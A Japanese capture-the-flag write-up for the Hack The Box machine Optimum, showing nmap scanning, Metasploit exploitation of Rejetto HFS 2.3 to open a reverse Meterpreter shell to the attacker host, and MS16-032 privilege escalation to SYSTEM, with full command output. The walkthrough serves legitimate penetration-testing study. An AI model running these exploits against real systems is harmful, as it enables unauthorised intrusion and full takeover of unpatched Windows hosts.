# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
Twitter:@yukitsukai1731

# Optimum
HackTheBox公式より
![スクリーンショット 2020-06-05 17.16.22.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/5cb721ff-1af6-a19a-3437-2545d6b14b66.png)

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.

Optimumは、主に既知のエクスプロイトを用いたサービスの列挙に焦点を当てた初心者レベルのマシンです。どちらの悪用も簡単に入手でき、関連するMetasploitモジュールを持っているので、このマシンを完成させるのはかなり簡単です。

# スキャン
Optimum(10.10.10.8)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 

```
nmap -sC -sV -Pn -oN optimum.nmap 10.10.10.8
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
kali@kali:~/htb/Optimum$ nmap -sC -sV -Pn -oN optimum 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 04:08 EDT
Nmap scan report for 10.10.10.8
Host is up (0.24s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.96 seconds
```

80番ポートが空いているのでブラウザからWebページを見てみましょう。
するとHttpFileServer 2.3というもので動いていることがトップページから分かります。

![スクリーンショット 2020-06-05 17.23.19.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/7d792670-a09d-c020-9331-5e7a74992dc0.png)
searchsploitを使って何か使えそうなものがないか調べてみましょう。

```
kali@kali:~$ searchsploit hfs
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Serv | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)        | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure    | osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escala | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution     | windows/remote/37985.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service    | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Met | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilit | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Executio | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Executio | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command | windows/webapps/34852.txt
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

ちょうどHFS2.3のにはRCEの脆弱性があるようです。
Exploit-dbでも検索してみると、Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)と言うものが見つかります。

![スクリーンショット 2020-06-05 18.05.45.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/895d9f73-033e-7857-ef5c-5b48a4876df6.png)

metasploitに利用できそうなモジュールがないか検索してみましょう。

```
msf5 > search hfs

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

検索結果から exploit/windows/http/rejetto_hfs_exec が利用できそうなので、これを使いたいと思います。
ほんとはnmapが終了した時点でgobusterとniktoも回していたのですが、トップページでHFSのバージョンが載っており、それを利用することができたため中断しました。


# 侵入

```

msf5 > use exploit/windows/http/rejetto_hfs_exec 
msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Using URL: http://0.0.0.0:8080/mQbrrSlbEHv7nCD
[*] Local IP: http://172.16.52.128:8080/mQbrrSlbEHv7nCD
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /mQbrrSlbEHv7nCD
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.8:49179) at 2020-06-05 04:21:57 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\EqHnfxO.vbs' on the target

meterpreter > 
[!] Tried to delete %TEMP%\EqHnfxO.vbs, unknown result

meterpreter > getuid
Server username: OPTIMUM\kostas
```

これでユーザ権限を手に入れることができました。
次は管理者権限の取得を目指しましょう。

# 特権エスカレーション

meterpreterでシェルを手に入れているのでlocal_exploit_suggesterを使って、何か権限昇格に使えそうなものを探しましょう。

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 31 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed
```

ここではms16_032_secondary_logon_handle_privescを使って、権限昇格ができるか試してみましょう。

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\FrZYZbuwUY.ps1...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1112

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1376
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

17FuzO8dLYkCWZMGou4F9yXl31Cn71IL
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.7:4444 -> 10.10.10.8:49185) at 2020-06-05 04:32:21 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\FrZYZbuwUY.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
ms16_032_secondary_logon_handle_privescを使うことでNT AUTHORITY\SYSTEM権限を手に入れることができました。
お疲れ様でした。
